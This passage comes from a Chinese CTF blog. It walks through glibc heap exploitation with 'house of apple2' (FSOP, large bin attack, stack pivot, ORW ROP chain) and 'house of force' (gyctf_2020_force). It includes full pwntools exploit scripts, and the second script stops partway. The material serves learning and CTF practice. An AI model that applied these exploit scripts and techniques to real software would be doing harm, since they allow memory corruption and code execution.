alt="image-20230202093211719"></p><p>上面的代码说明 <code>key</code> 实际的范围是 <code>0x660 ~ 0xaa0</code></p><p>然后有四个功能分别是 <code>add</code> <code>delete</code> <code>read</code> <code>write</code> （如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020934204.png" alt="image-20230202093401108" style="zoom:50%;" /><p><code>add</code> 函数中只能选择三种大小的堆块申请，分别是 <code>key</code> <code>key+0x10</code> <code>2*key</code> ，并且只能 <code>add</code> 函数只负责申请堆块，无法向申请的堆块写入数据，最多能创建 <code>0x10</code> 个堆块。</p><p><code>delete</code> 函数存在一个 <code>UAF</code> 漏洞，如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302020938907.png" alt="image-20230202093807826" style="zoom:50%;" /><p><code>read</code> 和 <code>write</code> 函数就是一个用于向堆块正常写入数据（没有溢出），一个可以打印堆块中 <code>0x10</code> 的数据（使用的 <code>write</code> 函数不会被 <code>\x00</code> 截断），然后各自只能执行一次</p><h5 id="利用思路">利用思路</h5><p>这里只记录使用 <code>house of apple2</code> 的攻击手法，在 <code>house of apple1</code> 中 <strong>roderick</strong> 师傅展示了另一种的攻击方式（不过个人感觉没有 <code>apple2</code> 的利用简单），下面说一下整体的利用思路，至于具体布局结构体的细节还需要做题时自己用 <code>gdb</code> 一点一点调试出来。</p><h6 id="泄露-libc-和-heap-地址">泄露 <code>libc</code> 和 <code>heap</code> 地址</h6><p>因为只有一次 <code>write</code> 函数执行的机会，让堆块进入 <code>large bin</code> 中泄露两个地址是不可行的，因为用的是 <code>write</code> 打印出来的前 <code>0x10</code> 个字节都是 <code>libc</code> 地址。如果让 <code>unsorted bin</code> 中有两个堆块（不能合并），去打印 <code>unnsorted bin</code> 中的堆块就能用 <code>0x10</code> 的数据泄露出 <code>libc</code> 地址和堆地址了。</p><h6 id="large-bin-attack">large bin attack</h6><p>用上文提到的补充中的方法，先申请一个大的堆块，然后进入 <code>large bin</code> 中，然后篡改其 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code> （此时用了唯一一次写的机会），还需要去写其他数据，这里后面再说，篡改完 <code>bk_nextsize</code> 后，再让一个略小的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code> ，此时 <code>IO_list_all</code> 就为略小的堆块地址，但问题是我们只能控制大堆块中的数据，参考了 <strong>winmt</strong> 师傅的做法，再申请与小堆块等大的堆块就会从 <code>large bin</code> 中取出来小堆块，这样就会触发 <code>unlink</code> ，代码如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022258433.png" alt="image-20230202225821151" style="zoom:50%;" /><p>此时这几个指针为</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022259382.png" alt="image-20230202225959295"></p><p>这个 <code>p-&gt;bk_nextsize</code> 是  <code>IO_list_all-0x20</code> 的地址，而触发 <code>p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize</code> 就将大堆块的地址写入了 <code>IO_list_all-0x20+0x20</code> 的位置，所以只要再申请一个和小堆块等大的堆块，触发这个 <code>unlink</code> 就可以将大堆块的地址写入 <code>IO_list_all</code> 中了（<strong>roderick</strong> 师傅和<strong>winmt</strong> 师傅都太强了）</p><h6 id="伪造结构体-布局">伪造结构体&amp;&amp;布局</h6><p>控制了链表头指针，就意味着接下来就可以开始伪造 <code>IO_FILE</code> 了，因为这个 <code>IO_FILE</code> 的前几个字段都无法改变（因为是堆块的 <code>prev_size</code> <code>size</code> <code>fd</code> <code>bk</code> <code>fd_nextsize</code> <code>bk_nextsize</code> 字段），这会干扰我们伪造 <code>IO_FILE</code> 的字段（比如 <code>_flags</code> 字段这里我们不可控），因此我们这个结构体只控制 <code>IO_write_base</code> 和 <code>_chain</code> 字段，我专门把 <code>IO_write_base</code> 改成 <code>IO_list_all</code> 是因为这个字段需要大于 <code>IO_write_ptr</code> 字段，才不会触发 <code>overflow</code> ，然后通过 <code>_chain</code> 遍历到下个结构体的时候去开始真正利用。（此时伪造的第一个结构体如下）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022310901.png" alt="image-20230202231015667" style="zoom:50%;" /><p>接下来就要开始伪造触发 <code>overflow</code> 的这个 <code>IO_FILE</code> 结构体了，条件按照上面 <code>house of apple2</code> 中总结的伪造即可，这里伪造字段没啥可说的，只能对着 <code>gdb</code> 一点一点把偏移调出来，然后布局好，因为还要再布置一个 <code>wide_data</code> 结构体，所以调试起来要花费点时间。慢慢的按照每个条件的要求控制每个字段即可，下面直接给出最后伪造出来的结构体。</p><p>这是触发 <code>overflow</code> 的第二个伪造的 <code>IO_FILE</code></p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022316010.png" alt="image-20230202231655803" style="zoom:50%;" /><p>下面这个是伪造的 <code>_IO_wide_data</code> 结构体，因为堆块很大，所以放心布置即可</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318082.png" alt="image-20230202231820885" style="zoom:50%;" /><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022318642.png" alt="image-20230202231830333"></p><p>如果要获取 <code>shell</code> 的话，那控制 <code>IO_FILE</code> 的 <code>_flags</code> 字段为参数， <code>_wide_vtable</code> 中的 <code>overflow</code> 改成 <code>system</code> 地址即可获取  <code>shell</code>。</p><h6 id="栈迁移-rop">栈迁移&amp;&amp;rop</h6><p>但是打 <code>orw</code> 的话要略微麻烦一点，我这里是采用了 <code>winmt</code> 师傅提到的一个 <a href="https://bbs.kanxue.com/thread-272098.htm">方法</a>，利用下面这段 <code>gadget</code> 打了一个栈迁移，因为 <code>rdi+0x48</code> 可控（<code>rdi</code> 就是 <code>IO_FILE</code> 的首地址），所以 <code>rbp</code> 可控，所以 <code>rax</code> 可控，所以 <code> call   QWORD PTR [rax+0x28]</code> 可以控制程序的执行流，这里的执行流去调用 <code>leave ; ret</code> 进行一个栈迁移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;svcudp_reply+26&gt;:    mov    rbp,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;svcudp_reply+30&gt;:    mov    rax,QWORD PTR [rbp+0x18]</span><br><span class="line">&lt;svcudp_reply+34&gt;:    lea    r13,[rbp+0x10]</span><br><span class="line">&lt;svcudp_reply+38&gt;:    mov    DWORD PTR [rbp+0x10],0x0</span><br><span class="line">&lt;svcudp_reply+45&gt;:    mov    rdi,r13</span><br><span class="line">&lt;svcudp_reply+48&gt;:    call   QWORD PTR [rax+0x28]</span><br></pre></td></tr></table></figure><p>下面是正在执行这段 <code>gadget</code> 的情况</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022329670.png" alt="image-20230202232950364" style="zoom:50%;" /><p>下图为栈迁移后的情况，接下来触发 <code>rop</code> 链</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022330494.png" alt="image-20230202233043116" style="zoom:50%;" /><p>最后 <code>orw</code> 的 <code>rop</code> 链如下，此时将要开始执行</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022332120.png" alt="image-20230202233224913" style="zoom:50%;" /><h5 id="EXP">EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">d_a=<span class="number">0x13B9</span></span><br><span class="line">d_d=<span class="number">0x13C3</span></span><br><span class="line">d_r=<span class="number">0x13E0</span></span><br><span class="line">d_w=<span class="number">0x13FD</span> </span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choise: &quot;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_data</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Message: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_data</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your key &gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">write_data(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Message: \n&quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219ce0</span></span><br><span class="line">p.recv(<span class="number">2</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x13c0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps=libc_base+<span class="number">0x2160c0</span></span><br><span class="line">system=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=libc_base+<span class="number">0x00000000000562ec</span></span><br><span class="line">magic_gadget=libc_base+<span class="number">0x16a1fa</span></span><br><span class="line">pop_rsp_ret=<span class="number">0x0000000000035732</span>+libc_base</span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x000000000002a3e5</span></span><br><span class="line">add_rsp_ret=<span class="number">0x000000000003a889</span>+libc_base</span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdx_r12_ret=libc_base+<span class="number">0x000000000011f497</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr=libc_base+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall=libc_base+<span class="number">0xea5b9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0x518</span>)<span class="comment"># &#x27;flag&#x27; address</span></span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(pop_rax_ret)</span><br><span class="line">rop+=p64(<span class="number">2</span>)</span><br><span class="line">rop+=p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">3</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">rop+=p64(pop_rdi_ret)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(pop_rsi_ret)</span><br><span class="line">rop+=p64(heap_base+<span class="number">0xb40</span>)<span class="comment"># flag store address</span></span><br><span class="line">rop+=p64(pop_rdx_r12_ret)</span><br><span class="line">rop+=p64(<span class="number">0x50</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(write_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wide_data=p64(<span class="number">0</span>)*<span class="number">21</span></span><br><span class="line">wide_data+=p64(leave_ret)<span class="comment">#second call</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">wide_data+=<span class="string">b&quot;./flag\x00\x00&quot;</span></span><br><span class="line">wide_data+=p64(add_rsp_ret)<span class="comment">#第二次栈迁移  原因是rop链不能破坏下面的magic_gadget</span></span><br><span class="line">wide_data+=p64(<span class="number">0</span>)</span><br><span class="line">wide_data+=p64(heap_base+<span class="number">0x450</span>-<span class="number">0x68</span>+(<span class="number">8</span>*<span class="number">29</span>))</span><br><span class="line">wide_data+=p64(magic_gadget)<span class="comment">#first call</span></span><br><span class="line">wide_data+=rop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io_file=p64(~(<span class="number">2</span> | <span class="number">0x8</span> | <span class="number">0x800</span>)+(<span class="number">1</span>&lt;&lt;<span class="number">64</span>))<span class="comment">#_flags</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#write_base &amp;&amp; write_ptr</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x538</span>-<span class="number">0x20</span>)<span class="comment">#rbp  [rdi+0x48]</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">io_file+=p64(heap_base+<span class="number">0x450</span>)<span class="comment">#wide_data</span></span><br><span class="line">io_file+=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">io_file+=p64(_IO_wfile_jumps)</span><br><span class="line"></span><br><span class="line">payload=p64(libc_base+<span class="number">0x21a1f0</span>)*<span class="number">2</span>+p64(io_list_all)+p64(io_list_all-<span class="number">0x20</span>)<span class="comment">#io_write_base控制为io_list_all 因为需要大于io_write_ptr不触发overflow</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(heap_base+<span class="number">0x370</span>)<span class="comment">#chain    指向了第一个伪造的结构体的vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">14</span></span><br><span class="line">payload+=io_file</span><br><span class="line">payload+=wide_data</span><br><span class="line"></span><br><span class="line">read_data(<span class="number">0</span>,payload.ljust(<span class="number">0x880</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_w,d_r,<span class="number">0x12BC</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;enter your command: \n&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302022334166.png" alt="image-20230202233408774"></p><h4 id="总结：">总结：</h4><p>首先感谢 <strong>roderick</strong> 师傅分享这种攻击方法，<code>house of apple2</code> 所需的条件较少，是一种很优秀的攻击方法。</p><p>在学习的过程中，尽量多翻看源码，捋清函数的执行流，清楚需要绕过的检查以及所伪造的字段。在实际的题目中，需要经常使用 <code>gdb</code> 调试来边调边布局结构体中的数据，自己进入调试那种状态很美妙，似乎只有自己知道自己在做什么，通过调试来预测以及验证接下来程序的变化是很享受的一件事情（尽管重复的敲击那几个按键，手会比较酸 -&gt;.-&gt; ），这种东西只可意会不可言传。</p><p>多动手，多思考就会离真相更近一步。</p><h3 id="参考文章：">参考文章：</h3><p><a href="https://bbs.kanxue.com/thread-273418.htm">https://bbs.kanxue.com/thread-273418.htm</a></p><p><a href="https://www.roderickchan.cn/post/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple 一种新的glibc中IO攻击方法 (2) - roderick - record and learn! (roderickchan.cn)</a></p><p><a href="https://bbs.kanxue.com/thread-272098.htm">https://bbs.kanxue.com/thread-272098.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FSOP </tag>
            
            <tag> 伪造IO_FILE </tag>
            
            <tag> orw </tag>
            
            <tag> large bin attack </tag>
            
            <tag> house of apple </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of force的学习总结</title>
      <link href="/posts/73595adc.html"/>
      <url>/posts/73595adc.html</url>
      
        <content type="html"><![CDATA[<h1>house of force</h1><h2 id="介绍：">介绍：</h2><p>house of force是针对top chunk的一种手法，通过这种攻击手法，可以将top chunk更新到任意内存，再次申请堆块并写入数据，这就相当于任意地址任意写了。</p><h2 id="原理：">原理：</h2><p>在<strong>2.23和2.27</strong>的libc版本中，由于<strong>没有对top chunk的size合法性进行检查</strong>，因此如果我们能够<strong>控制top chunk的size位</strong>以及<strong>malloc在申请堆块时的大小不受限制</strong>，那么就可以完成该攻击。</p><p>先从malloc函数源码看起，如果malloc函数执行时发现没有任何的bins中的堆块能够满足需求，就会从top chunk中切下一块内存返回给malloc**(前提是top chunk能够有这么多内存供切割)**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;<span class="comment">//获取当前top chunk的地址</span></span><br><span class="line">size = chunksize (victim);<span class="comment">//计算top chunk的大小</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line"><span class="comment">//MINSIZE就是堆块的最小size，32位程序为0x10，64位程序为0x20</span></span><br><span class="line"><span class="comment">//如果top chunk的大小大于nb(程序执行malloc需要分配的内存大小)</span></span><br><span class="line"><span class="comment">//加上MINSIZE的大小，就从top chunk中来切一块内存</span></span><br><span class="line"><span class="comment">//之所以要加上MINSIZE是要保证切割后剩余的内存要是一个完整的堆块</span></span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;<span class="comment">//remainder_size为切割后的剩余大小</span></span><br><span class="line">    remainder = chunk_at_offset (victim, nb);<span class="comment">//remainder为切割前top chunk+nb的值，也就是切割后top chunk的地址</span></span><br><span class="line">    av-&gt;top = remainder;<span class="comment">//更新top chunk</span></span><br><span class="line">    <span class="comment">//下面两个set_head给切割出去的堆块以及切割后的top chunk设置新的size</span></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);<span class="comment">//调试用的，这里没用</span></span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);<span class="comment">//返回用户指针</span></span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>漏洞的利用在这一行代码<code>remainder = chunk_at_offset (victim, nb)</code> 如果我们可以控制nb的值，其实就可以控制remainder的值了(remainder就是切割后的top chunk的地址)，这个手法最终的效果就是精准控制切割后top chunk的地址。</p><h2 id="探究一下如何控制top-chunk的地址">探究一下如何控制top_chunk的地址</h2><p>下面我们深入分析一下上面那个式子，来探究一下如何精准控制top chunk的地址。</p><p>首先<code>remainder = chunk_at_offset (victim, nb)</code>等价于下面这个式子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+nb=top_chunk</span><br></pre></td></tr></table></figure><blockquote><p>victim为切割前的top chunk header地址<br>nb为实际要申请的内存大小<br>top_chunk为切割后的top chunk header的地址</p></blockquote><p>然后将nb和top_chunk再具体展开一下(解释在代码的下面)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nb=request_size+0x10</span><br><span class="line">top_chunk+0x10=target_addr</span><br></pre></td></tr></table></figure><blockquote><p>nb 也等于我们malloc时的内存大小(requset_size)，再加上一个0x10的chunk头<br>target_addr先假设是篡改top chunk后的地址<br>house of force的核心就是篡改top chunk的地址，而我们的数据自然是只能输入到用户区，因此我们需要让top chunk+0x10后才能保证target_addr是位于了篡改后chunk的用户区</p></blockquote><p>将上面两部分整合一下，即为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">victim+request_size+0x10=target_addr-0x10</span><br></pre></td></tr></table></figure><p>最终整理一下为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure><p>叙述一下这个式子就是我们 <strong>所申请的内存大小等于想要将top chunk篡改到的地址减去top chunk原本的地址再减去0x20</strong> <u>（32位程序是-0x10，原理一样，只不过原本0x8的内存单元变成了0x4，所以最终的值减半）</u></p><h2 id="house-of-force中对top-chunk的size进行的检查">house of force中对top chunk的size进行的检查</h2><p>此时我们执行malloc(request_size)，就可以将top chunk更新到指定的地址了么?</p><blockquote><p>不可以。别忘了存在一个检查<code>if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</code>通常来说我们这个request_size是个负数，强转为无符号整数进行判断时，request_size肯定为一个超大的数值，如果top chunk本身的size是正常的话，必然无法满足这个要求，因此house of force的一个条件就是可以控制top chunk的size位(通常都是通过溢出的方式)，将其size设置为-1，-1是转换成无符号整数时，将变成最大的数字0xffffffffffffffff，无论request_size为多大都可以通过if检查了。</p></blockquote><p>将top chunk的size改为0xffffffffffffffff后，再执行malloc(request_size)，即可将top chunk更新到我们指定的地址，然后再次malloc时即可将该内存申请出来，并写入数据。上述内容就是house of force的攻击过程了。</p><h2 id="house-of-force手法总结">house of force手法总结</h2><blockquote><p>适用libc版本:2.23 2.27</p><p>使用前提:</p><p>1、申请堆块的大小不受限制</p><p>2、能够篡改top chunk的size位(主要是通过溢出的手段)</p><p>3、有top chunk原本的地址(这一条在特殊情况下，可以不具备)</p><p>4、有将top chunk更新后的目的地址(这一条在特殊情况下，可以不具备)</p><p>PS：特殊情况为：我们只需要top chunk的地址更新到堆区，这样我们只需要知道top chunk和目的地址二者的偏移即可。(因为本身其实算request_size的时候要的就是二者偏移)(相关题目可以看hitcontraining_bamboobox)</p><p>攻击效果：可以将top chunk更新到任意已知地址，再将新的堆块从top chunk中申请出来写入数据。就可以达到任意地址任意写的目的。</p><p>防御措施：对top chunk的size位进行检查，判断是否合法</p></blockquote><h1>题目练习</h1><h2 id="gyctf-2020-force">gyctf_2020_force</h2><h3 id="保护策略：">保护策略：</h3><p><img src="../img/image-20221007212605409.png" alt="image-20221007212605409"></p><h3 id="程序分析：">程序分析：</h3><p><img src="../img/image-20221007212736745.png" alt="image-20221007212736745"></p><p>简单分析一下程序就会发现，这道题只有一个功能，就是add函数。</p><h3 id="漏洞所在：">漏洞所在：</h3><p><img src="../img/image-20221007212804763.png" alt=""></p><p>首先是malloc申请的内存大小无检查。</p><p><img src="../img/image-20221007212810461.png" alt="image-20221007212810461"></p><p>然后printf会打印出来申请的堆地址，最后就是不管malloc申请的内存多大，都可以输入0x50字节的内容，因此这里存在溢出(伪代码看的话这个*v0和*i没关系，但是看汇编的话就会发现这俩是一个东西，估计是转伪代码的时候出问题了吧)</p><h3 id="大致思路：">大致思路：</h3><p>因为这道题没有free函数，就一个add函数，因此很多手法都是失效了。但是因为这几个漏洞点正好符合house of force攻击的条件。所以就用house of force嘎嘎打了。</p><p>1、先申请一块超大内存，利用mmap映射后与libc基地址存在的固定偏移，来拿到libc基地址。</p><p>2、将top chunk的size位修改为-1</p><p>3、精心构造出申请chunk的大小，保证从top chunk中切下来后，让top chunk位于malloc_hook(其实应该位于realloc_hook上的，因为要用realloc来调整栈帧，不过这就是后话了)</p><p>4、申请堆块，将malloc_hook从top chunk中申请出来，然后写入one_gadget。</p><p>5、发现所有one_gadget都打不通，只能用realloc调整栈帧再打one_gadget</p><blockquote><p>然后我主要提三个点做一下相关解释吧:</p><p>1、为什么其他师傅都申请的是0x200000大小的堆块？</p><p>2、精心构造chunk大小，让top chunk位于malloc_hook上，这个chunk大小是怎么算的？</p><p>3、最后realloc+4是怎么调试出来的?</p></blockquote><h3 id="1、为什么其他师傅都申请的是0x200000大小的堆块？">1、为什么其他师傅都申请的是0x200000大小的堆块？</h3><p>如果大家这里尝试过mmap映射内存大小是几万字节或者十几万字节的话，应该会发现，本地能打通，但是远程打不通这个情况。</p><p><strong>导致了这个情况的原因是因为申请的堆块地址位于了ld中</strong>(请参考下图 )如果环境一样的情况下，libc和ld直接的固定偏移是可以直接用的，就是说你本地的环境如果和远程的环境一样的话(这个环境相同指的并不是libc相同)，你拿ld与libc的固定偏移，打远程也是ok的。但是如果本地和远程环境不一样，结果就是你本地用ld和libc的那个偏移能打通，但是到远程还用这个偏移拿到的就不是libc正确的基地址了。</p><p><img src="../img/image-20221007212827121.png" alt=""></p><p>经过我不断调试，发现当申请0x1FBFE9大小以上的时候，mmap映射的内存才会到libc区域。(最大是多少，我没有试)</p><p>所以说这里未必非要是申请0x200000大小的堆块，只要大于等于0x1fbfe9就行。这样申请出来的堆块地址就和libc基地址存在固定偏移了(如下图)</p><p><img src="../img/image-20221007212919863.png" alt="image-20221007212919863"></p><h3 id="2、申请的size为多少，才能让top-chunk位于malloc-hook上？">2、申请的size为多少，才能让top chunk位于malloc_hook上？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request_size=target_addr-0x20-victim</span><br></pre></td></tr></table></figure><p>直接套这个式子，解释在文章最开始。</p><p>都不用算出来，脚本直接这样写即可。</p><p><img src="../img/image-20221007212926940.png" alt=""></p><p><strong>这里多减了0x10的原因是因为，我将top chunk的地址篡改为了realloc_hook-8的位置。因为要连着realloc_hook和malloc_hook一起修改了,调整栈帧打one_gadget。</strong></p><h3 id="3、realloc-4是怎么调试出来的">3、realloc+4是怎么调试出来的?</h3><p>这个咋调试的话，本文就不具体说明了。主要会的师傅不需要解释，不会的师傅需要仔细解释说明。所以需要弄懂realloc+4咋调试出来的师傅 可以看我这篇<a href="https://www.cnblogs.com/ZIKH26/articles/16421631.html#_label3">文章</a>  仔细看完之后，保证嘎嘎会。如果对我写的哪里有疑问，可以一起交流一下。</p><h3 id="EXP">EXP:</h3><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc= load(<span class="string">&quot;b&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27797</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2:puts\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">    heap_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line">leak_libc_addr=add(<span class="number">0x210000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr+<span class="number">0x210ff0</span></span><br><span class="line">log_addr(<span 